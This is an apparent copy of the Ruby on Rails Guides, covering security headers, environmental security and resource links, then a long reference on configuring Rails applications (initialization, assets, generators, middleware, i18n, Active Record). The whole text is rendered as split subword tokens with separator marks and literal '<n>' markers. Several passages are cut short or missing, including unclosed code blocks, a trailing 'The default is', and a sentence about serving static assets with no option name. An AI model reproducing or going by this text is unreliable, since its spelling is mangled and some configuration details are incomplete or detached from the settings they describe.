▁Here ▁is ▁a ▁list ▁of ▁common ▁headers :
▁* ▁ X - Frame - Options
▁Set ▁it ▁to ▁' D E N Y ' ▁to ▁d en y ▁f r am ing ▁at ▁all ▁or ▁' A L L O W A L L ' ▁if ▁you ▁want ▁to ▁allow ▁f r am ing ▁for ▁all ▁website .
▁* ▁ X - X SS - Pro t ection
▁Set ▁it ▁to ▁' 0 ; ' ▁if ▁you ▁want ▁to ▁switch ▁ X SS ▁A udi to r ▁off ( use ful ▁if ▁response ▁contents ▁ script s ▁from ▁request ▁parameters )
▁* ▁ X - Content - Type - Options
▁ _ ' no s n if f ' ▁in ▁Rails ▁by ▁default _ ▁- ▁stop s ▁the ▁browser ▁from ▁guess ing ▁the ▁M I ME ▁type ▁of ▁a ▁file .
▁* ▁ X - Content - Security - P ol ic y
▁[ A ▁powerful ▁ mechanism ▁for ▁control l ing ▁which ▁site s ▁certain ▁content ▁types ▁can ▁be ▁loaded ▁from ]( http :// w 3 c . github . io / web app sec / spec s / content - security - p ol ic y / c s p - specific ation . dev . html )
▁* ▁Access - Control - A l low - O r ig in
▁Use d ▁to ▁control ▁which ▁site s ▁are ▁allowed ▁to ▁bypass ▁same ▁ origin ▁p ol ic ies ▁and ▁send ▁c ross - origin ▁requests .
▁* ▁ Strict - Trans port - Security
▁[ U s ed ▁to ▁control ▁if ▁the ▁browser ▁is ▁allowed ▁to ▁only ▁access ▁a ▁site ▁over ▁a ▁secure ▁connection ]( http :// en . wiki p edia . org / wiki / HTTP _ Strict _ Trans port _ Security )
▁ Environment al ▁ Security
▁ ------ ----------------
▁It ▁is ▁ beyond ▁the ▁scope ▁of ▁this ▁guide ▁to ▁in form ▁you ▁on ▁how ▁to ▁secure ▁your ▁application ▁code ▁and ▁environments .
▁However , ▁please ▁secure ▁your ▁database ▁configuration , ▁e . g . ▁` config / database . yml `, ▁and ▁your ▁server - side ▁secret , ▁e . g . ▁store d ▁in ▁` config / secret s . yml `.
▁You ▁may ▁want ▁to ▁further ▁restrict ▁access , ▁using ▁environment - specific ▁versions ▁of ▁these ▁files ▁and ▁any ▁other s ▁that ▁may ▁contain ▁ sensitive ▁information .
▁-------------- ------
▁The ▁security ▁ l and sc ap e ▁ s h if t s ▁and ▁it ▁is ▁important ▁to ▁keep ▁up ▁to ▁date , ▁because ▁missing ▁a ▁new ▁ vulnerabilit y ▁can ▁be ▁ cat a str o ph ic .
▁You ▁can ▁find ▁ additional ▁resources ▁about ▁( Rails ) ▁security ▁here :
▁* ▁The ▁Ruby ▁on ▁Rails ▁security ▁project ▁posts ▁security ▁new s ▁regular ly : ▁[ http :// www . r or security . info ]( http :// www . r or security . info )
▁* ▁S u b sc r i be ▁to ▁the ▁Rails ▁security ▁[ mail ing ▁list ]( http :// groups . google . com / group / rubyonrails - security )
▁* ▁[ K eep ▁up ▁to ▁date ▁on ▁the ▁other ▁application ▁layer s ]( http :// sec un i a . com / ) ▁( the y ▁have ▁a ▁ week ly ▁new s let ter , ▁too )
▁* ▁A ▁[ g ood ▁security ▁blog ]( http :// ha . c k ers . org / blog / ) ▁including ▁the ▁[ C ross - Site ▁ script ing ▁C h e at ▁S h e et ]( http :// ha . c k ers . org / x s s . html )
▁Configur ing ▁Rails ▁Application s
▁ ============== ================
▁This ▁guide ▁cover s ▁the ▁configuration ▁and ▁initialization ▁features ▁available ▁to ▁Rails ▁applications .
▁* ▁How ▁to ▁a d j us t ▁the ▁behavior ▁of ▁your ▁Rails ▁applications .
▁* ▁How ▁to ▁add ▁ additional ▁code ▁to ▁be ▁run ▁at ▁application ▁start ▁time .
▁ Location s ▁for ▁I nitialization ▁Code
▁Rails ▁offer s ▁four ▁standard ▁spot s ▁to ▁place ▁initialization ▁code :
▁* ▁` config / application . rb `
▁* ▁ Environment - specific ▁configuration ▁files
▁* ▁Initialize r s
▁* ▁After - initializers
▁Running ▁Code ▁Before ▁Rails
▁ --------- ----------------
▁In ▁the ▁rare ▁even t ▁that ▁your ▁application ▁needs ▁to ▁run ▁some ▁code ▁before ▁Rails ▁itself ▁is ▁loaded , ▁put ▁it ▁above ▁the ▁call ▁to ▁` require ▁' rails / all ' ` ▁in ▁` config / application . rb `.
▁Configur ing ▁Rails ▁Co mp on ent s
▁--------------- -------------
▁In ▁general , ▁the ▁work ▁of ▁ configuring ▁Rails ▁means ▁ configuring ▁the ▁components ▁of ▁Rails , ▁as ▁well ▁as ▁ configuring ▁Rails ▁itself .
▁The ▁configuration ▁file ▁` config / application . rb ` ▁and ▁environment - specific ▁configuration ▁files ▁( such ▁as ▁` config / environments / production . rb `) ▁allow ▁you ▁to ▁specify ▁the ▁ various ▁settings ▁that ▁you ▁want ▁to ▁pass ▁down ▁to ▁all ▁of ▁the ▁components .
▁For ▁example , ▁the ▁` config / application . rb ` ▁file ▁includes ▁this ▁setting :
▁config . autoload _ path s ▁ + = ▁% W ( # { config . root } / ext ra s )
▁This ▁is ▁a ▁setting ▁for ▁Rails ▁itself .
▁If ▁you ▁want ▁to ▁pass ▁settings ▁to ▁individual ▁Rails ▁components , ▁you ▁can ▁do ▁so ▁via ▁the ▁same ▁` config ` ▁object ▁in ▁` config / application . rb ` :
▁config . active _ record . schema _ format ▁= ▁: ruby
▁Rails ▁will ▁use ▁that ▁particular ▁setting ▁to ▁configure ▁Active ▁Record .
▁### ▁Rails ▁General ▁Configuration
▁These ▁configuration ▁methods ▁are ▁to ▁be ▁called ▁on ▁a ▁` Rails :: Railtie ` ▁object , ▁such ▁as ▁a ▁sub class ▁of ▁` Rails :: Engine ` ▁or ▁` Rails :: Application `.
▁* ▁` config . after _ initialize ` ▁take s ▁a ▁block ▁which ▁will ▁be ▁run ▁ _ after _ ▁Rails ▁has ▁finished ▁initializ ing ▁the ▁application .
▁That ▁includes ▁the ▁initialization ▁of ▁the ▁framework ▁itself , ▁engines , ▁and ▁all ▁the ▁application ' s ▁initializer s ▁in ▁` config / initializers `.
▁Note ▁that ▁this ▁block ▁ _ will _ ▁be ▁run ▁for ▁rake ▁task s .
▁Use ful ▁for ▁ configuring ▁values ▁set ▁up ▁by ▁other ▁initializer s :
▁config . after _ initialize ▁do
▁ ActionView :: Base . sanitize d _ allow ed _ tag s . delete ▁' div '
▁* ▁` config . asset _ host ` ▁set s ▁the ▁host ▁for ▁the ▁assets .
▁S h or ter ▁version ▁of ▁` config . action _ controller . asset _ host `.
▁* ▁` config . autoload _ on ce _ path s ` ▁accept s ▁an ▁array ▁of ▁paths ▁from ▁which ▁Rails ▁will ▁ autoload ▁constant s ▁that ▁won ' t ▁be ▁ w ip ed ▁per ▁request .
▁Re le v ant ▁if ▁` config . cache _ classes ` ▁is ▁false , ▁which ▁is ▁the ▁case ▁in ▁development ▁mode ▁by ▁default .
▁Otherwise , ▁all ▁ autoload ing ▁happens ▁only ▁once .
▁All ▁elements ▁of ▁this ▁array ▁must ▁also ▁be ▁in ▁` autoload _ path s `.
▁Default ▁is ▁an ▁empty ▁array .
▁* ▁` config . autoload _ path s ` ▁accept s ▁an ▁array ▁of ▁paths ▁from ▁which ▁Rails ▁will ▁ autoload ▁constant s .
▁Default ▁is ▁all ▁directories ▁under ▁` app `.
▁* ▁` config . cache _ classes ` ▁control s ▁whether ▁or ▁not ▁application ▁classes ▁and ▁module s ▁should ▁be ▁reload ed ▁on ▁each ▁request .
▁Defaults ▁to ▁false ▁in ▁development ▁mode , ▁and ▁true ▁in ▁test ▁and ▁production ▁mode s . < n >< n >
▁* ▁` config . action _ view . cache _ template _ load ing ` ▁control s ▁whether ▁or ▁not ▁templates ▁should ▁be ▁reload ed ▁on ▁each ▁request .
▁* ▁` config . beginning _ of _ week ` ▁set s ▁the ▁default ▁beginning ▁of ▁ week ▁for ▁the < n > application .
▁A c ce p t s ▁a ▁valid ▁ week ▁day ▁symbol ▁( e . g . ▁`: monday ` ).
▁* ▁` config . cache _ store ` ▁configure s ▁which ▁cache ▁store ▁to ▁use ▁for ▁Rails ▁caching .
▁ Options ▁include ▁one ▁of ▁the ▁symbols ▁`: memory _ store `, ▁`: file _ store `, ▁`: me m _ cache _ store `, ▁`: null _ store `, ▁or ▁an ▁object ▁that ▁implement s ▁the ▁cache ▁API .
▁Defaults ▁to ▁`: file _ store ` ▁if ▁the ▁directory ▁` t mp / cache ` ▁exists , ▁and ▁to ▁`: memory _ store ` ▁otherwise .
▁* ▁` config . color ize _ logging ` ▁specifie s ▁whether ▁or ▁not ▁to ▁use ▁A N S I ▁color ▁code s ▁when ▁logging ▁information .
▁Defaults ▁to ▁true .
▁* ▁` config . co n side r _ all _ request s _ local ` ▁is ▁a ▁flag .
▁If ▁true ▁the n ▁any ▁error ▁will ▁cause ▁ detailed ▁debugging ▁information ▁to ▁be ▁ dump ed ▁in ▁the ▁HTTP ▁response , ▁and ▁the ▁` Rails :: In f o ` ▁controller ▁will ▁show ▁the ▁application ▁runtime ▁context ▁in ▁` / rails / info / properties `.
▁T r ue ▁by ▁default ▁in ▁development ▁and ▁test ▁environments , ▁and ▁false ▁in ▁production ▁mode .
▁For ▁fine r - gr a in ed ▁control , ▁set ▁this ▁to ▁false ▁and ▁implement ▁` local _ request ?` ▁in ▁controllers ▁to ▁specify ▁which ▁requests ▁should ▁provide ▁debugging ▁information ▁on ▁errors .
▁* ▁` config . console ` ▁allows ▁you ▁to ▁set ▁class ▁that ▁will ▁be ▁used ▁as ▁console ▁you ▁run ▁` rails ▁console `.
▁It ' s ▁best ▁to ▁run ▁it ▁in ▁` console ` ▁block :
▁console ▁do
▁# ▁this ▁block ▁is ▁called ▁only ▁when ▁running ▁console ,
▁# ▁so ▁we ▁can ▁safe ly ▁require ▁p ry ▁here
▁require ▁" p ry "
▁config . console ▁= ▁P ry
▁* ▁` config . dependency _ load ing ` ▁is ▁a ▁flag ▁that ▁allows ▁you ▁to ▁disable ▁constant ▁ autoload ing ▁setting ▁it ▁to ▁false .
▁It ▁only ▁has ▁effect ▁if ▁` config . cache _ classes ` ▁is ▁true , ▁which ▁it ▁is ▁by ▁default ▁in ▁production ▁mode . < n >< n >
▁This ▁includes ▁your ▁application , ▁engines , ▁Rails ▁frameworks ▁and ▁any ▁other ▁registered ▁ namespace .
▁* ▁` config . eager _ load _ namespace s ` ▁ register s ▁ namespace s ▁that ▁are ▁ eager ▁loaded ▁when ▁` config . eager _ load ` ▁is ▁true .
▁All ▁ namespace s ▁in ▁the ▁list ▁must ▁respond ▁to ▁the ▁` eager _ load !` ▁method .
▁* ▁` config . eager _ load _ path s ` ▁accept s ▁an ▁array ▁of ▁paths ▁from ▁which ▁Rails ▁will ▁ eager ▁load ▁on ▁b oo t ▁if ▁cache ▁classes ▁is ▁enabled .
▁Defaults ▁to ▁every ▁folder ▁in ▁the ▁` app ` ▁directory ▁of ▁the ▁application .
▁* ▁` config . en coding ` ▁set s ▁up ▁the ▁application - wide ▁encoding .
▁Defaults ▁to ▁ UT F -8 .
▁* ▁` config . exception s _ app ` ▁set s ▁the ▁exception s ▁application ▁invoked ▁by ▁the ▁Show E xception ▁middleware ▁when ▁an ▁exception ▁happens .
▁Defaults ▁to ▁` ActionDispatch :: P u b li c E xception s . new ( Rails . public _ path ) `.
▁* ▁` config . file _ watch er ` ▁the ▁class ▁used ▁to ▁detect ▁file ▁update s ▁in ▁the ▁file system ▁when ▁` config . reload _ classes _ only _ on _ change ` ▁is ▁true .
▁M us t ▁con form ▁to ▁` ActiveSupport :: File U p date C h ec k er ` ▁API .
▁* ▁` config . filter _ parameters ` ▁used ▁for ▁filter ing ▁out ▁the ▁parameters ▁that < n > you ▁don ' t ▁want ▁show n ▁in ▁the ▁log s , ▁such ▁as ▁passwords ▁or ▁c r edit ▁ card < n > number s .
▁ New ▁applications ▁filter ▁out ▁passwords ▁by ▁adding ▁the ▁following ▁` config . filter _ parameters + = [: password ]` ▁in ▁` config / initializers / filter _ param e ter _ logging . rb `.
▁* ▁` config . force _ ssl ` ▁force s ▁all ▁requests ▁to ▁be ▁under ▁HTTP S ▁protocol ▁by ▁using ▁` ActionDispatch :: SSL ` ▁middleware .
▁* ▁` config . log _ format ter ` ▁defines ▁the ▁format ter ▁of ▁the ▁Rails ▁ logger .
▁This ▁option ▁defaults ▁to ▁an ▁instance ▁of ▁` ActiveSupport :: Logger :: S i mp le For m at ter ` ▁for ▁all ▁mode s ▁except ▁production , ▁where ▁it ▁defaults ▁to ▁` Logger :: For m at ter `.
▁* ▁` config . log _ level ` ▁defines ▁the ▁verb o s ity ▁of ▁the ▁Rails ▁ logger .
▁* ▁` config . log _ tag s ` ▁accept s ▁a ▁list ▁of ▁methods ▁that ▁the ▁` request ` ▁object ▁respond s ▁to .
▁This ▁make s ▁it ▁easy ▁to ▁tag ▁log ▁lines ▁with ▁debug ▁information ▁like ▁sub domain ▁and ▁request ▁id ▁- ▁both ▁very ▁helpful ▁in ▁debugging ▁ multi - user ▁production ▁applications .
▁* ▁` config . logger ` ▁accept s ▁a ▁ logger ▁con form ing ▁to ▁the ▁interface ▁of ▁ Log 4 r ▁or ▁the ▁default ▁Ruby ▁` Logger ` ▁class .
▁* ▁` config . middleware ` ▁allows ▁you ▁to ▁configure ▁the ▁application ' s ▁middleware .
▁This ▁is ▁covered ▁in ▁depth ▁in ▁the ▁[ Co n fig ur ing ▁Middleware ](# configuring - middleware ) ▁section ▁below .
▁* ▁` config . reload _ classes _ only _ on _ change ` ▁enable s ▁or ▁disable s ▁reload ing ▁of ▁classes ▁only ▁when ▁track ed ▁files ▁change .
▁By ▁default ▁track s ▁everything ▁on ▁ autoload ▁paths ▁and ▁is ▁set ▁to ▁true .
▁If ▁` config . cache _ classes ` ▁is ▁true , ▁this ▁option ▁is ▁ignored .
▁* ▁` secret s . secret _ key _ base ` ▁is ▁used ▁for ▁specify ing ▁a ▁key ▁which ▁allows ▁sessions ▁for ▁the ▁application ▁to ▁be ▁verifie d ▁again st ▁a ▁known ▁secure ▁key ▁to ▁prevent ▁tamper ing .
▁Application s ▁get ▁` secret s . secret _ key _ base ` ▁initialize d ▁to ▁a ▁random ▁key ▁present ▁in ▁` config / secret s . yml `.
▁Un like ▁the ▁default ▁setting ▁set ▁this ▁to ▁true ▁when ▁running ▁( abs ol ute ly ▁not ▁recommended ! ) ▁or ▁testing ▁your ▁app ▁in ▁production ▁mode ▁using ▁WEBrick .
▁Otherwise ▁you ▁won ' t ▁be ▁able ▁use ▁page ▁caching ▁and ▁requests ▁for ▁files ▁that ▁exist ▁regular ly ▁under ▁the ▁public ▁directory ▁will ▁any way ▁hit ▁your ▁Rails ▁app .
▁* ▁` config . session _ store ` ▁is ▁usually ▁set ▁up ▁in ▁` config / initializers / session _ store . rb ` ▁and ▁specifie s ▁what ▁class ▁to ▁use ▁to ▁store ▁the ▁session .
▁P ossible ▁values ▁are ▁`: cookie _ store ` ▁which ▁is ▁the ▁default , ▁`: me m _ cache _ store `, ▁and ▁`: d is able d `.
▁The ▁last ▁one ▁tell s ▁Rails ▁not ▁to ▁deal ▁with ▁sessions .
▁C us to m ▁session ▁store s ▁can ▁also ▁be ▁specified :
▁config . session _ store ▁: my _ custom _ store
▁This ▁custom ▁store ▁must ▁be ▁defined ▁as ▁` ActionDispatch :: Session :: M y C us to m Store `.
▁* ▁` config . time _ zone ` ▁set s ▁the ▁default ▁time ▁zone ▁for ▁the ▁application ▁and ▁enable s ▁time ▁zone ▁a w ar en es s ▁for ▁Active ▁Record .
▁### ▁Configur ing ▁ Asset s
▁* ▁` config . assets . en able d ` ▁a ▁flag ▁that ▁control s ▁whether ▁the ▁asset < n > pipeline ▁is ▁enabled .
▁It ▁is ▁set ▁to ▁true ▁by ▁default .
▁Re com m end ed ▁in ▁` config / environments / development . rb ` ▁to ▁ mini m ize ▁un expected ▁behavior ▁when ▁deploying ▁to ▁` production `.
▁* ▁` config . assets . compress ` ▁a ▁flag ▁that ▁enable s ▁the ▁compression ▁of ▁ compiled ▁assets .
▁It ▁is ▁explicitly ▁set ▁to ▁true ▁in ▁` config / environments / production . rb `.
▁* ▁` config . assets . css _ compressor ` ▁defines ▁the ▁CSS ▁ compressor ▁to ▁use .
▁It ▁is ▁set ▁by ▁default ▁by ▁` sass - rails `.
▁The ▁unique ▁ alternative ▁value ▁at ▁the ▁moment ▁is ▁`: yui `, ▁which ▁uses ▁the ▁` yui - compressor ` ▁gem .
▁* ▁` config . assets . js _ compressor ` ▁defines ▁the ▁JavaScript ▁ compressor ▁to ▁use .
▁P ossible ▁values ▁are ▁`: c lo s ure `, ▁`: uglifier ` ▁and ▁`: yui ` ▁which ▁require ▁the ▁use ▁of ▁the ▁` c lo s ure - compile r `, ▁` uglifier ` ▁or ▁` yui - compressor ` ▁gems ▁respectively .
▁* ▁` config . assets . path s ` ▁contains ▁the ▁paths ▁which ▁are ▁used ▁to ▁look ▁for ▁assets .
▁App end ing ▁paths ▁to ▁this ▁configuration ▁option ▁will ▁cause ▁those ▁paths ▁to ▁be ▁used ▁in ▁the ▁search ▁for ▁assets .
▁* ▁` config . assets . precompile ` ▁allows ▁you ▁to ▁specify ▁ additional ▁assets ▁( other ▁than ▁` application . css ` ▁and ▁` application . js `) ▁which ▁are ▁to ▁be ▁pre compiled ▁when ▁` rake ▁assets : precompile ` ▁is ▁run .
▁* ▁` config . assets . prefix ` ▁defines ▁the ▁prefix ▁where ▁assets ▁are ▁served ▁from .
▁Defaults ▁to ▁` / assets `.
▁* ▁` config . assets . debug ` ▁disable s ▁the ▁ concat en ation ▁and ▁compression ▁of ▁assets .
▁Set ▁to ▁` true ` ▁by ▁default ▁in ▁` development . rb `.
▁* ▁` config . assets . cache _ store ` ▁defines ▁the ▁cache ▁store ▁that ▁Sprockets ▁will ▁use .
▁The ▁default ▁is
▁* ▁` config . assets . version ` ▁is ▁an ▁option ▁string ▁that ▁is ▁used ▁in ▁M D 5 ▁hash ▁generation .
▁This ▁can ▁be ▁changed ▁to ▁force ▁all ▁files ▁to ▁be ▁re compiled .
▁* ▁` config . assets . compile ` ▁is ▁a ▁boolean ▁that ▁can ▁be ▁used ▁to ▁turn ▁on ▁live ▁Sprockets ▁com p il ation ▁in ▁production .
▁* ▁` config . assets . logger ` ▁accept s ▁a ▁ logger ▁con form ing ▁to ▁the ▁interface ▁of ▁ Log 4 r ▁or ▁the ▁default ▁Ruby ▁` Logger ` ▁class .
▁Defaults ▁to ▁the ▁same ▁configured ▁at ▁` config . logger `.
▁Setting ▁` config . assets . logger ` ▁to ▁false ▁will ▁turn ▁off ▁served ▁assets ▁logging .
▁### ▁Configur ing ▁Generat or s
▁Rails ▁allows ▁you ▁to ▁alter ▁what ▁generator s ▁are ▁used ▁with ▁the ▁` config . generator s ` ▁method .
▁This ▁method ▁take s ▁a ▁block :
▁config . generator s ▁do ▁| g |
▁g . or m ▁: active _ record
▁g . test _ framework ▁: test _ unit
▁The ▁full ▁set ▁of ▁methods ▁that ▁can ▁be ▁used ▁in ▁this ▁block ▁are ▁as ▁follows :
▁* ▁` assets ` ▁allows ▁to ▁create ▁assets ▁on ▁ generating ▁a ▁scaffold .
▁Defaults ▁to ▁` true `. < n >
▁* ▁` force _ p l ur al ` ▁allows ▁ pluralize d ▁model ▁names .
▁Defaults ▁to ▁` false `.
▁* ▁` helper ` ▁defines ▁whether ▁or ▁not ▁to ▁generate ▁helpers .
▁* ▁` integration _ to ol ` ▁defines ▁which ▁integration ▁tool ▁to ▁use .
▁Defaults ▁to ▁` nil `.
▁* ▁` javascripts ` ▁turn s ▁on ▁the ▁ hook ▁for ▁JavaScript ▁files ▁in ▁generator s .
▁Use d ▁in ▁Rails ▁for ▁when ▁the ▁` scaffold ` ▁generator ▁is ▁run .
▁* ▁` javascript _ engine ` ▁configure s ▁the ▁engine ▁to ▁be ▁used ▁( for ▁ eg . ▁ coffee ) ▁when ▁ generating ▁assets .
▁* ▁` or m ` ▁defines ▁which ▁or m ▁to ▁use .
▁Defaults ▁to ▁` false ` ▁and ▁will ▁use ▁Active ▁Record ▁by ▁default .
▁* ▁` resource _ controller ` ▁defines ▁which ▁generator ▁to ▁use ▁for ▁ generating ▁a ▁controller ▁when ▁using ▁` rails ▁generate ▁resource `.
▁Defaults ▁to ▁`: controller `.
▁Defaults ▁to ▁`: scaffold _ controller `.
▁* ▁` stylesheets ` ▁turn s ▁on ▁the ▁ hook ▁for ▁stylesheets ▁in ▁generator s .
▁Use d ▁in ▁Rails ▁for ▁when ▁the ▁` scaffold ` ▁generator ▁is ▁run , ▁but ▁this ▁ hook ▁can ▁be ▁used ▁in ▁other ▁generates ▁as ▁well .
▁* ▁` stylesheet _ engine ` ▁configure s ▁the ▁stylesheet ▁engine ▁( for ▁ eg . ▁ sass ) ▁to ▁be ▁used ▁when ▁ generating ▁assets .
▁Defaults ▁to ▁`: css `.
▁* ▁` test _ framework ` ▁defines ▁which ▁test ▁framework ▁to ▁use .
▁Defaults ▁to ▁` false ` ▁and ▁will ▁use ▁ Test :: U n it ▁by ▁default .
▁* ▁` template _ engine ` ▁defines ▁which ▁template ▁engine ▁to ▁use , ▁such ▁as ▁ERB ▁or ▁H am l .
▁Defaults ▁to ▁`: erb `.
▁### ▁Configur ing ▁Middleware
▁Every ▁Rails ▁application ▁comes ▁with ▁a ▁standard ▁set ▁of ▁middleware ▁which ▁it ▁uses ▁in ▁this ▁order ▁in ▁the ▁development ▁environment :
▁* ▁` ActionDispatch :: SSL ` ▁force s ▁every ▁request ▁to ▁be ▁under ▁HTTP S ▁protocol .
▁Wi ll ▁be ▁available ▁if ▁` config . force _ ssl ` ▁is ▁set ▁to ▁` true `.
▁ Options ▁passed ▁to ▁this ▁can ▁be ▁configured ▁by ▁using ▁` config . ssl _ options `.
▁* ▁` ActionDispatch :: S t at ic ` ▁is ▁used ▁to ▁serve ▁static ▁assets .
▁* ▁` Rack :: Lock ` ▁wrap s ▁the ▁app ▁in ▁m ute x ▁so ▁it ▁can ▁only ▁be ▁called ▁by ▁a ▁single ▁thread ▁at ▁a ▁time .
▁On ly ▁enabled ▁when ▁` config . cache _ classes ` ▁is ▁` false `.
▁* ▁` ActiveSupport :: Cache :: S trategy :: Local Cache ` ▁serve s ▁as ▁a ▁basic ▁memory ▁back ed ▁cache .
▁This ▁cache ▁is ▁not ▁thread ▁safe ▁and ▁is ▁intend ed ▁only ▁for ▁serving ▁as ▁a ▁temporary ▁memory ▁cache ▁for ▁a ▁single ▁thread .
▁* ▁` Rack :: Runtime ` ▁set s ▁an ▁` X - Runtime ` ▁header , ▁containing ▁the ▁time ▁( in ▁second s ) ▁take n ▁to ▁execute ▁the ▁request .
▁* ▁` Rails :: Rack :: Logger ` ▁not if ies ▁the ▁log s ▁that ▁the ▁request ▁has ▁be g un .
▁After ▁request ▁is ▁complete , ▁f l us h es ▁all ▁the ▁log s .
▁* ▁` ActionDispatch :: ShowExceptions ` ▁rescue s ▁any ▁exception ▁returned ▁by ▁the ▁application ▁and ▁render s ▁nice ▁exception ▁pages ▁if ▁the ▁request ▁is ▁local ▁or ▁if ▁` config . co n side r _ all _ request s _ local ` ▁is ▁set ▁to ▁` true `.
▁If ▁` config . action _ dispatch . show _ exception s ` ▁is ▁set ▁to ▁` false `, ▁exception s ▁will ▁be ▁raised ▁regardless .
▁* ▁` ActionDispatch :: Request I d ` ▁make s ▁a ▁unique ▁ X - Request - I d ▁header ▁available ▁to ▁the ▁response ▁and ▁enable s ▁the ▁` ActionDispatch :: Request # u u id ` ▁method .
▁* ▁` ActionDispatch :: Re m o t e I p ` ▁check s ▁for ▁ IP ▁sp o of ing ▁attacks ▁and ▁get s ▁valid ▁` client _ ip ` ▁from ▁request ▁headers .
▁Configur able ▁with ▁the ▁` config . action _ dispatch . ip _ s p o of ing _ check `, ▁and ▁` config . action _ dispatch . tr us t ed _ p r o x ies ` ▁options .
▁* ▁` Rack :: Sendfile ` ▁intercept s ▁response s ▁who se ▁body ▁is ▁being ▁served ▁from ▁a ▁file ▁and ▁replace s ▁it ▁with ▁a ▁server ▁specific ▁ X - Sendfile ▁header .
▁Configur able ▁with ▁` config . action _ dispatch . x _ s end file _ header `.
▁* ▁` ActionDispatch :: Callbacks ` ▁run s ▁the ▁ prepare ▁callbacks ▁before ▁serving ▁the ▁request .
▁* ▁` ActiveRecord :: Connection Adapters :: Connection M an age ment ` ▁clean s ▁active ▁connection s ▁after ▁each ▁request , ▁unless ▁the ▁` rack . test ` ▁key ▁in ▁the ▁request ▁environment ▁is ▁set ▁to ▁` true `.
▁* ▁` ActiveRecord :: Query Cache ` ▁cache s ▁all ▁ SELECT ▁queries ▁generated ▁in ▁a ▁request .
▁If ▁any ▁ IN S ER T ▁or ▁ UPDATE ▁take s ▁place ▁the n ▁the ▁cache ▁is ▁clean ed .
▁* ▁` ActionDispatch :: Co o k ies ` ▁set s ▁cookies ▁for ▁the ▁request .
▁* ▁` ActionDispatch :: Session :: CookieStore ` ▁is ▁responsib le ▁for ▁storing ▁the ▁session ▁in ▁cookies .
▁An ▁alternate ▁middleware ▁can ▁be ▁used ▁for ▁this ▁by ▁changing ▁the ▁` config . action _ controller . session _ store ` ▁to ▁an ▁alternate ▁value .
▁Add it ion ally , ▁options ▁passed ▁to ▁this ▁can ▁be ▁configured ▁by ▁using ▁` config . action _ controller . session _ options `.
▁* ▁` ActionDispatch :: Flash ` ▁set s ▁up ▁the ▁` flash ` ▁keys .
▁On ly ▁available ▁if ▁` config . action _ controller . session _ store ` ▁is ▁set ▁to ▁a ▁value .
▁* ▁` ActionDispatch :: ParamsParser ` ▁pars es ▁out ▁parameters ▁from ▁the ▁request ▁into ▁` params `.
▁* ▁` Rack :: Method O ve r r id e ` ▁allows ▁the ▁method ▁to ▁be ▁overrid de n ▁if ▁` params [: _ method ]` ▁is ▁set .
▁This ▁is ▁the ▁middleware ▁which ▁supports ▁the ▁ PATCH , ▁ PUT , ▁and ▁DELETE ▁HTTP ▁method ▁types .
▁Be side s ▁these ▁usual ▁middleware , ▁you ▁can ▁add ▁your ▁own ▁by ▁using ▁the ▁` config . middleware . use ` ▁method :
▁config . middleware . use ▁M a g ical :: U n ic or n s
▁This ▁will ▁put ▁the ▁` M a g ical :: U n ic or n s ` ▁middleware ▁on ▁the ▁end ▁of ▁the ▁stack .
▁You ▁can ▁use ▁` insert _ before ` ▁if ▁you ▁wish ▁to ▁add ▁a ▁middleware ▁before ▁another .
▁There ' s ▁also ▁` insert _ after ` ▁which ▁will ▁insert ▁a ▁middleware ▁after ▁another :
▁Middleware s ▁can ▁also ▁be ▁completely ▁ s w app ed ▁out ▁and ▁replaced ▁with ▁other s :
▁config . middleware . s w ap ▁ ActionController :: F a il safe , ▁ Lifo :: F a il safe
▁They ▁can ▁also ▁be ▁removed ▁from ▁the ▁stack ▁completely :
▁config . middleware . delete ▁" Rack :: Method O ve r r id e "
▁### ▁Configur ing ▁i 18 n
▁All ▁these ▁configuration ▁options ▁are ▁delegate d ▁to ▁the ▁` I 18 n ` ▁library .
▁* ▁` config . i 18 n . available _ locale s ` ▁ white list s ▁the ▁available ▁locale s ▁for ▁the ▁app .
▁Defaults ▁to ▁all ▁locale ▁keys ▁found ▁in ▁locale ▁files , ▁usually ▁only ▁`: en ` ▁on ▁a ▁new ▁application .
▁* ▁` config . i 18 n . default _ locale ` ▁set s ▁the ▁default ▁locale ▁of ▁an ▁application ▁used ▁for ▁i 18 n .
▁Defaults ▁to ▁`: en `.
▁* ▁` config . i 18 n . en force _ available _ locale s ` ▁ensure s ▁that ▁all ▁locale s ▁passed ▁through ▁i 18 n ▁must ▁be ▁declare d ▁in ▁the ▁` available _ locale s ` ▁list , ▁rais ing ▁an ▁` I 18 n :: In valid Local e ` ▁exception ▁when ▁setting ▁an ▁un available ▁locale .
▁Defaults ▁to ▁` true `.
▁It ▁is ▁recommended ▁not ▁to ▁disable ▁this ▁option ▁unless ▁ strong ly ▁required , ▁since ▁this ▁works ▁as ▁a ▁security ▁me as ure ▁again st ▁setting ▁any ▁invalid ▁locale ▁from ▁user ▁input .
▁* ▁` config . i 18 n . load _ path ` ▁set s ▁the ▁path ▁Rails ▁uses ▁to ▁look ▁for ▁locale ▁files .
▁Defaults ▁to ▁` config / locale s / * . { yml , rb } `.
▁### ▁Configur ing ▁Active ▁Record
▁` config . active _ record ` ▁includes ▁a ▁variety ▁of ▁configuration ▁options :
▁* ▁` config . active _ record . logger ` ▁accept s ▁a ▁ logger ▁con form ing ▁to ▁the ▁interface ▁of ▁ Log 4 r ▁or ▁the ▁default ▁Ruby ▁ Logger ▁class , ▁which ▁is ▁the n ▁passed ▁on ▁to ▁any ▁new ▁database ▁connection s ▁made .
▁You ▁can ▁retrieve ▁this ▁ logger ▁by ▁calling ▁` logger ` ▁on ▁either ▁an ▁Active ▁Record ▁model ▁class ▁or ▁an ▁Active ▁Record ▁model ▁instance .
▁Set ▁to ▁` nil ` ▁to ▁disable ▁logging .
▁* ▁` config . active _ record . primary _ key _ prefix _ type ` ▁let s ▁you ▁a d j us t ▁the ▁naming ▁for ▁primary ▁key ▁columns .
▁By ▁default , ▁Rails ▁assume s ▁that ▁primary ▁key ▁columns ▁are ▁named ▁` id ` ▁( and ▁this ▁configuration ▁option ▁does n ' t ▁need ▁to ▁be ▁set .)
▁There ▁are ▁two ▁other ▁choice s :
▁** ▁`: table _ name ` ▁would ▁make ▁the ▁primary ▁key ▁for ▁the ▁C us to m er ▁class ▁` customer id `
▁** ▁`: table _ name _ with _ underscore ` ▁would ▁make ▁the ▁primary ▁key ▁for ▁the ▁C us to m er ▁class ▁` customer _ id `
▁* ▁` config . active _ record . table _ name _ prefix ` ▁let s ▁you ▁set ▁a ▁g lo b al ▁string ▁to ▁be ▁ prepend ed ▁to ▁table ▁names .
